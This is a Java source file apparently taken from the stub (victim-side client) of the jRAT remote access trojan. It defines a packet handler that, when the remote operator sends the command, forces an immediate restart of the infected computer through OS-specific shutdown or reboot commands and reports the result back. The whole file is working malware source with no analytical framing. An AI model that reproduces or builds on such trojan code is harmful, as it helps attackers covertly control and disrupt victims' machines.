package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Constants;

import com.redpois0n.oslib.OperatingSystem;

public class Packet29RestartComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec("shutdown.exe -t 0 -r -f");
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
				Runtime.getRuntime().exec("shutdown -r now");
			} else {
				Runtime.getRuntime().exec("reboot");
			}
			
			Connection.instance.status(Constants.STATUS_STARTING_SHUTDOWN);
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.instance.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
